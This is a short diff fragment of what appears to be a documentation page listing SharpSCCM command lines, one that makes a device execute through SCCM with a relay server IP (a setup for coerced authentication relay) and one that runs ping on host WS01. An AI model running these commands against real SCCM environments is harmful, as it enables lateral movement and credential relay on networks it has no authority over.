@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:26:32.932559+00:00'
 .\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
 .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
 ```
+
+
